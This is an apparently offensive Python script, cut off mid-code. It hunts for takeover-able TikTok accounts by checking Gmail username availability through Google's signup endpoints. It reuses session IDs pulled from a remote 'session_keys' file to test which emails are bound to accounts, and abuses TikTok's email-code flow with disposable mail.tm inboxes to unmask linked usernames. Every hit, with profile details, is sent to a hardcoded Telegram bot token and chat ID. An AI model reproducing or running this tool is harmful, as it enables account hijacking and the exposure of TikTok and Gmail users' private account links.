import aiohttp,aiofiles
import asyncio
import random
import time
import requests
from PKK import Gmail
import uuid
import json
import string
import os
import re
import hashlib
import uuid,SignerPy
from datetime import datetime
from random import choice, randrange
from user_agent import generate_user_agent
from faker import Faker
from hsopyt import Argus, Ladon, Gorgon
from ms4 import *
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
#uu=requests.get('https://raw.githubusercontent.com/muojoig7/tik/refs/heads/main/krff.txt').text
#key='krf'#input('Key : ')
#if key in uu:
#    	print('Good Login')
#    	os.system('clear')
#    	pass
#else:
#	print('وقفت الاداة @k_1_cc')
#	exit()
tok ='7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ'# input('Token : ')
ID =7402878964#input('Id : ')
#url = f"https://api.telegram.org/bot{tok}/getChat?chat_id={ID}"
#res = requests.get(url).json()
#if res.get("ok"):
#    chat = res["result"]
#    username11 = chat.get("username", None)
#    first_name11 = chat.get("first_name", None)
#    print(f'هلا حبيبي {first_name11} نورت الاداة انتظر ثواني ')
#    #.sleep(5)
#os.system('clear')
#params = {
#    "chat_id": '@k_1_cc',
#    "user_id": ID 
#}
#try:
#    res = requests.get('https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/getChatMember', params=params, timeout=10).json()
#    #print(res)
#    if res.get("ok"):
#        status = res["result"]["status"]
#        if status in ["member", "administrator", "creator"]:
#            pass
#        else:
#            print('اكلخرا وانضم لقناتي ادب سز @k_1_cc')
#            exit()
#    else:
#        print("Error:", res.get("description", "Unknown error"))
#        exit()

#except requests.exceptions.RequestException as e:
#    print(f"Error connecting to Telegram API: {e}")
#    exit()
#except Exception as e:
#    #print(f"Unexpected error: {e}")
#    pass
    

lin1= [
    "f699c60e0671ac8cf07b47b98876e750", "7cf8a3e3bca42407ea32f928ba32554a",
    "6e6ebdef9d110ea8468066a99fb35431", "185a9f97624b8070e74e6e3670973f5c",
    "2b37fd4151b4eaf7196f5f5e7e659f64", "e75ed27910bc3b0d134faa20f7d6be86",
    "f2dbfc92b25541c5bce8cf50239a1c8b", "de2319ad927bad889e66008a9bcfbc6a",
    "1534fed19164846bdc0679359b961627", "3f87ee5dbe03993c0f6e602487f9ede8",
    "026268b95716b09091705c48002a7e95", "f98471c9220848e8fa3ad8ea31c86225",
    "13cfd7515fd4f8e7c3fb1c2baee1d4e5", "2427cb040ce70c87cb3b7027115bff4c",
    "1715803b0d3ac0d74b4ded219e2dc29f", "f7a3b3d4b075b192cffd1beb30b813c7",
    "67c2c22b58488d874c31b4286643f001", "c4fc9de1eb64c613f59572e8b2fcfdd8",
    "b84c01904844bfc45216d073852ef9b1", "86fd5bd98326e1478e6eec4aeb581640",
    "7957b4c38e4d1d3114bec3b8a23d7172", "c12715fc9ab601f89f18463312f7f400",
    "9f0c8fd90ac11845025201ea6fb81f1b", "686a259b53d792a96eb099e6326536f3",
    "74ec3f5c1d33d16ee3a1f6785fe78ec3", "ada25f00d415c4132222e4effa5ce82d",
    "9abb0f87feb47e0d06f881565d8eb8cd", "16639e388e0ba30f1d28501c55f06c86",
    "ee4a11d378dfa212af06cdee36efaee4", "4ac0724e4dec4619c9a1661e4aa29e15",
    "0359bb8217ffc2669f7c4c0b3ac63e52", "57944088296cc7a2e28dc2159bbc6354",
    "8dd15f4d3d6e751daf7622c54367036d", "f1dd9337d28e66926f3fa53459be5698",
    "2f01dd8e8a583daf36d893db276214f1", "677972bc0970cb4c2cb5aa62c0173739",
    "3e99fe2e40577af27dc4fb15f9b438f7"
]
uu = "https://raw.githubusercontent.com/is-L7N/session_keys/refs/heads/main/github.txt"
rr = requests.get(uu,timeout=30)
lin = rr.text.splitlines()
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m'
Pk = '\x1b[38;5;231m'

h = gt = bg = bt = blog = blo = sese = 0
I = Console()
import kiloa
async def inf(email,ses,h):
    try:
        exuser = ex(email)
        def get_tiktok_info_sync(username):
            url = f"https://www.tiktok.com/@{username}"
            resp = requests.get(url=url).text
            pattern = r'"userInfo":({.*?}),"shareMeta"'
            m = re.search(pattern, resp)
            if not m:
                return {}
            data = json.loads(m.group(1))
            user = data.get("user", {})
            stats = data.get("stats", {})
            name = user.get("nickname", "")
            followers = stats.get("followerCount", "")
            following = stats.get("followingCount", "")
            like = stats.get("heartCount", "")
            video = stats.get("videoCount", "")
            countryn = user.get("region", "")
            cdt_raw = user.get("createTime", "")
            try:
                Date = datetime.utcfromtimestamp(int(cdt_raw)).strftime("%Y-%m-%d")
            except:
                Date = ""
            bio = user.get("signature", "")
            avatar = user.get("avatarLarger", "")
            return {
                "name": name,
                "followers": followers,
                "following": following,
                "like": like,
                "video": video,
                "country": countryn,
                "Date": Date,
                "bio": bio,
                "avatar": avatar
            }

        async def get_info(user):
            info = await asyncio.to_thread(get_tiktok_info_sync, user)
            try:level = kiloa.TikTok().GetLevel(user).get('Level','')
            except:level=None
            name = info.get("name", "")
            followers = info.get("followers", "")
            following = info.get("following", "")
            like = info.get("like", "")
            video = info.get("video", "")
            countryn = info.get("country", "")
            cdt = info.get("Date", "")
            bio = info.get("bio", "")
            avatar = info.get("avatar", "")
            return level, name, followers, following, like, video, countryn, cdt, bio, avatar

        if exuser is not None:
            level, name, followers, following, like, video, countryn, cdt, bio, avatar = await get_info(exuser)
            tlg= (f'''
『🔥』ʜɪᴛ ᴛɪᴋᴛᴏᴋ [{h}]『🔥』
________________________
    email : {email}@gmail.com
    User : {exuser}
________________________
𝙣𝙖𝙢𝙚:{name}
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨: {followers}
𝙡𝙞𝙠𝙚:{like}
𝙫𝙞𝙙𝙚𝙤: {video} 
𝙘𝙤𝙪𝙣𝙩𝙧𝙮: {countryn} 
𝙙𝙖𝙩𝙖: {cdt} 
𝙇𝙚𝙫𝙚𝙡 : {level}
𝙇𝙞𝙣𝙠: tiktok.com/@{exuser}
________________________
BY : @D_B_HH  CH :  @k_1_cc
            ''')
            photo_to_send = avatar if avatar else 'https://e.top4top.io/p_3616uhe9o0.jpg'
            requests.get(
                f"https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendPhoto",
                params={
                    "chat_id": 7402878964,
                    "photo": photo_to_send,
                    "caption": tlg,
                }
            )
        else:
            level, name, followers, following, like, video, countryn, cdt, bio, avatar = await get_info(email)
            tlg= (f'''
『🔥』ʜɪᴛ ᴛɪᴋᴛᴏᴋ [{h}]『🔥』
________________________
    email : {email}@gmail.com
    User : {exuser}
________________________
𝙣𝙖𝙢𝙚:{name}
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨: {followers}
𝙡𝙞𝙠𝙚:{like}
𝙫𝙞𝙙𝙚𝙤: {video} 
𝙘𝙤𝙪𝙣𝙩𝙧𝙮: {countryn} 
𝙙𝙖𝙩𝙖: {cdt} 
𝙇𝙚𝙫𝙚𝙡 : {level}
𝙇𝙞𝙣𝙠: tiktok.com/@{email}
________________________
BY : @D_B_HH  CH :  @k_1_cc
            ''')
            photo_to_send = avatar if avatar else 'https://e.top4top.io/p_3616uhe9o0.jpg'
            requests.get(
                f"https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendPhoto",
                params={
                    "chat_id": 7402878964,
                    "photo": photo_to_send,
                    "caption": tlg,
                }
            )

    except Exception as err:
        requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={err}')
        pass
import requests
import time
import random
import json
import string
from threading import Thread
import os
import user_agent
from requests import post
from user_agent import generate_user_agent
from random import choice
from random import randrange
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime

async def Tik(email,ses):
  try:
  	host=random.choice([
    "api16-normal-c-alisg.tiktokv.com",
    "api2-19-h2.musical.ly",
    "api21-h2.tiktokv.com",
    "api32-normal-alisg.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api21-normal.tiktokv.com",
    "api16-normal-zr.tiktokv.com",
    "api22-normal-zr.tiktokv.com",
    "api32-normal.tiktokv.com",
    "api19-normal-zr.tiktokv.com",
    "api19-normal.tiktokv.com",
    "api31-normal.tiktokv.com",
    "api16-normal-c-useast1a.musical.ly",
    "api16-normal.tiktokv.com",
    "api31-normal-zr.tiktokv.com",
    "api9-normal.tiktokv.com",
    "api22-normal.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api32-normal-zr.tiktokv.com",
    "api16-normal-baseline.tiktokv.com",
    "api74-normal.tiktokv.com",
    "api16-normal.ttapis.com"
])
  	params={"device_id": '73' + ''.join(random.choices('0123456789', k=16)),"channel":"googleplay","aid": "1233","version_code": "310503","version_name": "31.5.3","os_version": "11","app_language": "en","app_version":"37.8.8"}
  	query_string = "&".join([f"{k}={v}" for k, v in params.items()])
  	current_timestamp = int(time.time())
  	gorgon = Gorgon(query_string, current_timestamp, data=None, cookies=None)
  	gorgon_headers = gorgon.get_value()
  	jj=random.choice(lin)
  	headers = {'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 12; ar; TECNO BF6; Build/SP1A.210812.001; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",'x-khronos':gorgon_headers['x-khronos'],'Cookie':f'sessionid={jj}'}
  	data = {'multi_login': '1','email':email+'@gmail.com'}
  	async with ses.post(f'https://{host}/passport/email/bind_without_verify/', headers=headers, data=data,params=params) as r1:
  		res= await r1.text()
  		print(res)
  		if 'Email is linked to another account. Unlink or try another email.' in res:
  		                return True
                    
  		elif 'Account is already linked' in res:
  		                return False
  		                
  		elif 'Session expired' in res:
                    return None
                    
  except Exception as e1:
        pass                    
    
red='\033[1;31m'
async def lo(email):
    global h, gt, bg, bt, blog, blo, sese
    logo='''
\033[1;31m───────█████████████████████
\033[1;31m────████▀─────────────────▀████
\033[1;31m──███▀───────────────────────▀███
\033[1;31m─██▀───────────────────────────▀██
\033[1;31m█▀───────────────────────────────▀█
\033[1;31m█─────────────────────────────────█
\033[1;31m█─────────────────────────────────█
\033[1;31m█─────────────────────────────────█
\033[1;31m█───█████─────────────────█████───█
\033[1;31m█──██▓▓▓███─────────────███▓▓▓██──█
\033[1;31m█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
\033[1;31m█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
\033[1;31m█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
\033[1;31m▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
\033[1;31m──█▄────▀█████▀─────▀█████▀────▄█
\033[1;31m─▄██───────────▄█─█▄───────────██▄
\033[1;31m─███───────────██─██───────────███
\033[1;31m─███───────────────────────────███
\033[1;31m──▀██──██▀██──█──█──█──██▀██──██▀
\033[1;31m───▀████▀─██──█──█──█──██─▀████▀
\033[1;31m────▀██▀──██──█──█──█──██──▀██▀
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m───────────█▄▄█▄▄█▄▄█▄▄█
'''
    os.system('cls' if os.name == 'nt' else 'clear')
    Ylogo = Panel(logo, title="", border_style="red", title_align="center")
    Y = Panel(f"Hit : {h}\nBad : {bg}\nBlocks : {blog}", title="Gmail", border_style="green", title_align="center")
    S = Panel(f"Good : {gt}\nBad : {bt}\nBlocks : {blo}", title="TikTok", border_style="yellow", title_align="center")
    Ss = Panel(f"Tele : @D_B_HH [Mustafa] \n Ch : @k_1_cc \n LinkCh : https://t.me/k_1_cc \n My account : https://t.me/D_B_HH", title="Devloper", border_style="white", title_align="center")

    I.print(Ylogo,Y, S, Ss, sep="\n")
from user_agent import generate_user_agent
#from SignerPy import *
import requests, json, secrets, uuid, binascii, os, time, random,re
#class TikTok1:
#    @staticmethod
#    def xor(string):
#          return "".join([hex(ord(c) ^ 5)[2:] for c in string])
def ex(email):
    for _ in range(3):
        try:
            ss = requests.Session()
            gm = email + '@gmail.com'

            pm = {
                'device_platform': 'android',
                'ssmix': 'a',
                'channel': 'googleplay',
                'aid': '1233',
                'app_name': 'musical_ly',
                'version_code': '360505',
                'version_name': '36.5.5',
                'manifest_version_code': '2023605050',
                'update_version_code': '2023605050',
                'ab_version': '36.5.5',
                'os_version': '10',
                'device_id': 0000000000,
                'app_version': '30.1.2',
                'request_from': 'profile_card_v2',
                'request_from_scene': '1',
                'scene': '1',
                'mix_mode': '1',
                'os_api': '34',
                'ac': 'wifi',
                'request_tag_from': 'h5'
            }

            hd = {
                'User-Agent': f'com.zhiliaoapp.musically/2022703020 '
                              f'(Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;'
                              f'tt-ok/{str(random.randint(1,10**19))})'
            }

            pm = SignerPy.get(params=pm)
            pm.update({'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}',
                       'language': 'AR'})

            tk = None

            for _ in range(5):
                try:
                    pm["account_param"] = gm
                    sg = SignerPy.sign(params=pm)

                    h2 = hd.copy()
                    h2.update({
                        'x-tt-passport-csrf-token': uuid.uuid4().hex,
                        'x-ss-req-ticket': sg['x-ss-req-ticket'],
                        'x-argus': sg['x-argus'],
                        'x-gorgon': sg['x-gorgon'],
                        'x-khronos': sg['x-khronos'],
                        'x-ladon': sg['x-ladon']
                    })

                    ul = f'https://{random.choice(["api31-normal-useast2a.tiktokv.com","api22-normal-c-alisg.tiktokv.com","api2.musical.ly","api16-normal-useast5.tiktokv.us","api16-normal-no1a.tiktokv.eu","rc-verification-sg.tiktokv.com","api31-normal-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api22-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.musical.ly","api.tiktokv.com","www.tiktok.com","log2.musical.ly","webcast.musical.ly","inapp.tiktokv.com","api2-19-h2.musical.ly"])}' + "/passport/account_lookup/email/"

                    rp = ss.post(ul, params=pm, headers=h2, timeout=15)
                    dt = rp.json()

                    if dt.get('data', {}).get('accounts'):
                        tk = dt['data']['accounts'][0]['passport_ticket']
                        break

                except:
                    pass

            if not tk:
                continue

            fk = None

            for _ in range(5):
                try:
                    rs = requests.get("https://api.mail.tm/domains",
                                      headers={"Content-Type": "application/json",
                                               "User-Agent": "Mozilla/5.0"},
                                      timeout=15)

                    dm = rs.json()["hydra:member"][0]["domain"]
                    ml = ''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(12)) + "@" + dm

                    pl = {"address": ml, "password": ml}

                    requests.post("https://api.mail.tm/accounts", json=pl,
                                  headers={"Content-Type": "application/json",
                                           "User-Agent": "Mozilla/5.0"},
                                  timeout=15)

                    rs = requests.post("https://api.mail.tm/token", json=pl,
                                       headers={"Content-Type": "application/json",
                                                "User-Agent": "Mozilla/5.0"},
                                       timeout=15)

                    tn = rs.json().get("token")

                    if tn:
                        fk = (ml, tn)
                        break

                except:
                    pass

            if not fk:
                continue

            for _ in range(5):
                try:
                    pm["not_login_ticket"] = tk
                    pm["email"] = fk[0]
                    pm["type"] = "3737"

                    pm.pop("fixed_mix_mode", None)
                    pm.pop("account_param", None)

                    sg = SignerPy.sign(params=pm)

                    h3 = hd.copy()
                    h3.update({
                        'x-ss-req-ticket': sg['x-ss-req-ticket'],
                        'x-argus': sg['x-argus'],
                        'x-gorgon': sg['x-gorgon'],
                        'x-khronos': sg['x-khronos'],
                        'x-ladon': sg['x-ladon']
                    })

                    ul = f"https://{random.choice(['api22-normal-c-alisg.tiktokv.com','api31-normal-alisg.tiktokv.com','api22-normal-probe-useast2a.tiktokv.com','api16-normal-probe-useast2a.tiktokv.com','rc-verification-sg.tiktokv.com'])}/passport/email/send_code"

                    rp = ss.post(ul, params=pm, headers=h3, timeout=15)
                    rd = rp.json()

                    if rd.get("message") == "success":

                        for _ in range(20):
                            try:
                                rs = requests.get("https://api.mail.tm/messages",
                                                  headers={"Authorization": f"Bearer {fk[1]}",
                                                           "Content-Type": "application/json",
                                                           "User-Agent": "Mozilla/5.0"},
                                                  timeout=15)

                                ib = rs.json().get("hydra:member", [])

                                if ib:
                                    ix = ib[0]["id"]

                                    rs = requests.get(f"https://api.mail.tm/messages/{ix}",
                                                      headers={"Authorization": f"Bearer {fk[1]}",
                                                               "Content-Type": "application/json",
                                                               "User-Agent": "Mozilla/5.0"},
                                                      timeout=15)

                                    ms = rs.json()
                                    tx = ms.get("text", "")

                                    if tx:
                                        r1 = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+)\.', tx)

                                        if r1:
                                            return r1.group(1)

                                        patterns = [
                                            r"This email was created for\s+(.+)\.",
                                            r"created for\s+(.+)\.",
                                            r"username\s*:\s*([^\s,]+)",
                                            r"@(\w+)"
                                        ]

                                        for pn in patterns:
                                            mh = re.search(pn, tx)
                                            if mh:
                                                return mh.group(1)

                            except:
                                pass

                except:
                    pass

        except:
            pass
        
async def gm(email):
    N = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10)))
    b = (random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28))#.
    long_encoded_string = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj_AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA3MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juoEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'
    common_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }
    batch_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-same-domain': '1',
    }

    try:
        async with aiohttp.ClientSession(headers=common_headers) as session:
            params_get = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }
            
            async with session.get('https://accounts.google.com/lifecycle/flows/signup', params=params_get) as response:
                response_text = await response.text()
                tl_match = re.search(r'TL=([^&]+)', str(response.url))
                tl = tl_match.group(1) if tl_match else None
                
                s1_match = re.search(r'"Qzxixc":"([^"]+)"', response_text)
                s1 = s1_match.group(1) if s1_match else None
                
                at_match = re.search(r'"SNlM0e":"([^"]+)"', response_text)
                at = at_match.group(1) if at_match else None

                if not all([tl, s1, at]):
                    return {'status': 'Error', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH', 'message': 'Failed to extract initial tokens.'}

            batch_headers['x-goog-ext-391502476-jspb'] = f'["{s1}"]'
            session.headers.update(batch_headers)
            params_post_1 = {
                'rpcids': 'E815hb',
                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_1 = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{N}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
            
            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_1,
                data=data_post_1,
            ) as response:
                await response.text()
            params_post_2 = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_2 = long_encoded_string.format(b[0], b[1], b[2], at)

            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_2,
                data=data_post_2,
            ) as response:
                await response.text()
            params_post_3 = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_3 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_3,
                data=data_post_3,
            ) as response:
                final_response_text = await response.text()
            if 'password' in final_response_text:
                return {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}
            else:
                return {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}

    except Exception as e:
        pass
        
from PKK import Gmail
async def s():
    global h, gt, bg, bt, blog, blo, sese
    
    async with aiohttp.ClientSession() as ses:    
        agent = str(generate_user_agent())
        faker = Faker()
        faker1 = Faker('ar')
        faker2 = Faker('hi_IN')
        faker3 = Faker('tr_TR')
        faker4 = Faker('fa')
        faker5 = Faker('en_NG')
        
        cl = '1234567890qwertyuiopasdfghjklzxcvbnm.'
        num = '6789'
        mu = faker.user_name()
        bh = faker1.user_name()
        ch = faker2.user_name()
        dh = faker3.user_name()
        hh = faker4.user_name()
        gh = faker5.user_name()
        
        arabic_letters = 'ابتثجحخدذرزسشصضطظعغفقكلمنهوي'
        hindi_letters = 'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ'
        turkish_letters = 'abcçdefgğhıijklmnoöprsştuüvyz'
        nigerian_letters = 'abcdefghijklmnopqrstuvwxyz'
        persian_letters = 'ابپتثجچحخدذرزسشصضطظعغفقکگلمنوهی'
        
        all_letters = arabic_letters + hindi_letters + turkish_letters + nigerian_letters + persian_letters
        keyword = ''.join((random.choice(all_letters) for i in range(random.randrange(3, 15))))
        
        rng = int("".join(random.choice(num) for _ in range(1)))
        name = "".join(random.choice(cl) for _ in range(rng))
        user = random.choice([mu, bh, ch, dh, hh, gh, name])

        params = {
            'WebIdLastTime': str(int(time.time())),
            'aid': '1988',
            'app_language': 'ar',
            'app_name': 'tiktok_web',
            'browser_language': 'en-US',
            'browser_name': 'Mozilla',
            'browser_online': 'true',
            'browser_platform': 'Linux armv81',
            'browser_version': agent,
            'channel': 'tiktok_web',
            'cookie_enabled': 'true',
            'data_collection_enabled': 'false',
            'device_id': '73' + ''.join(random.choices('0123456789', k=16)),
            'device_platform': 'web_pc',
            'focus_state': 'true',
            'from_page': 'search',
